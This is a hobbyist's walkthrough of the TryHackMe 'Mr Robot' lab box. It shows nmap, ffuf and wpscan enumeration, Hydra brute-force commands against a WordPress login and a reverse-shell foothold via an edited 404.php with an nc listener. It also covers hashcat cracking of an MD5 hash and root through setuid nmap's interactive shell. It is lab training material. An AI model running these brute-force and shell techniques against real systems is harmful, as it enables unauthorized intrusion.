*2021-09-18*

*kimm3*

# Walkthrough: Mr Robot
Platform: TryHackMe

Difficulty: Medium

- [Link](https://tryhackme.com/room/mrrobot)

Mr. Robot themed box.
## Setup
![ll](assets/markdown-img-paste-20210826112245589.png)

`script history/enum1; export IP=10.10.188.192; ping $IP;`

(Machine responds to ICMP echo)
## Scans and enumeration
`sudo nmap $IP -p- -A -Pn -v -oA scans/nmap-init`

![nmap-init](assets/markdown-img-paste-20210918080156789.png)

![index-p80](assets/markdown-img-paste-20210918075547670.png)

A really cool site with a shell inspired from the TV show. The commands return cool stuff from the show, but nothing useful. The 'join' command let's you enter an email address. Site dosen't return anything different based on input. It dosen't send anything to email address.

![post-join](assets/markdown-img-paste-20210918080854341.png)

![index-p443-warning](assets/markdown-img-paste-20210918080102662.png)

Same site but with https.

![index-p443](assets/markdown-img-paste-20210918080131245.png)

`ffuf -u "http://10.10.47.240/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -of md -o scans/ffuf-init80`

The search takes alot of time, but with the inital results, we can identify that it hosts a wordpress site.

![ffuf-init](assets/markdown-img-paste-20210918090801400.png)

![403-forbidden](assets/markdown-img-paste-20210918083030879.png)

We don't have access to the blog url, but if we just type a lot of junk after we get the wordpress 404(not found) site.

![random-404](assets/markdown-img-paste-20210918083042324.png)

![readme](assets/markdown-img-paste-20210918083529167.png)

The readme file.

![robotstxt](assets/markdown-img-paste-20210918084213122.png)

The robots.txt give us a filename that contains one of the keys, also a dictionary/wordlist file.

![key1txt](assets/markdown-img-paste-20210918084307405.png)

1 of 3 complete.

`wpscan --url http://10.10.47.240/ -e`

`wpscan --url http://10.10.47.240/ --enumerate u1-1000`

![enum-users-1000](assets/markdown-img-paste-2021091808585164.png)

Not being able to enumerate users via ID. Having seen the show I tried 'elliot' which existed.

![elliot](assets/markdown-img-paste-2021091809133023.png)

If I hadn't seen the show, you could have gotten the username with a public wordlist, or the fsocity.dic, using hydra:

```
hydra -L sl/Usernames/Names/names.txt -p test 10.10.47.240 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.47.240%2Fwp-admin%2F&testcookie=1:F=Invalid username."
```

![hydra-elliot](assets/markdown-img-paste-20210918103650511.png)

(This only test if the username exists, 'test' is not the password.)

Now we can try to brute-force elliots password. Generating a custom wordlist with elliots last name, birthday, pet name.

![cupp-elliot](assets/markdown-img-paste-20210918120241836.png)

`wpscan --password-attack "wp-login" --url "http://10.10.47.240/" -U 'elliot' -P elliot.txt`

![wpscan-elliottxt-pw](assets/markdown-img-paste-20210918120316547.png)

Nothing, let's try to use the fsocity.dic that we found in the 'robots.txt'. The file has a huge number of lines, but most of them are dupclicates:

![uniqe-lines](assets/markdown-img-paste-20210923091023533.png)

Sorting out all dupclicates

`sort foundfiles/fsocity.dic | uniq > foundfiles/fsocity.dic.sort`

The webserver is really slow, so if you don't sort them out or start from the bottom of the list, it will take longer to scan than you can have a machine active on TryHackMe. Even with this shorter list and 32 threads, it took hydra nearly 30 minutes to go through the wordlist.

![hydra-elliot](assets/markdown-img-paste-20210923103733923.png)

` hydra -l elliot -P foundfiles/fsocity.dic.sort 10.10.137.132 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.137.132%2Fwp-admin%2F&testcookie=1:F=login_error" -f -t 32`

## Foothold
Now that we have a wp-admin login, we can change php files to inlcude reverse shells and execute them to gain a foothold. To automate the process with metasploit, use `exploit/unix/webapp/wp_admin_shell_upload`.

![revshphp](assets/markdown-img-paste-20210923104055876.png)

![404-edited](assets/markdown-img-paste-20210923104135963.png)

```
nc -lvnp 445
curl http://10.10.137.132/wp-content/theme/twentyfifteen/404.php
```

![foothold](assets/markdown-img-paste-20210923104643291.png)

The second flag is in the robot home folder, but only robot user can read it. It seems that a md5 hash of robots password is saved in cleartext.

![md5password](assets/markdown-img-paste-20210923105050218.png)

`hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b foundfiles/fsocity.dic.sort`

![hc-md5-exhausted](assets/markdown-img-paste-20210923105333452.png)

`hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b sl/Passwords/Leaked-Databases/rockyou.txt`

![hc-md5-cracked](assets/markdown-img-paste-20210923105400948.png)

![key2-of-3txt](assets/markdown-img-paste-20210923105644747.png)

Key 2 of 3 complete.
## Privilege Escalation
![roottxt](assets/markdown-img-paste-2021092311092189.png)

Key 3 of 3 and prives was rather easy. Search for setuids with:

`find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

One that stands out is nmap. There are several vulnerabilities if you can run nmap as root. The easiest is starting it in interactive mode wich allows us to run system commands from inside nmap.

`!sh`

For more setuid vulns, see [this link](https://gtfobins.github.io/gtfobins/nmap/).
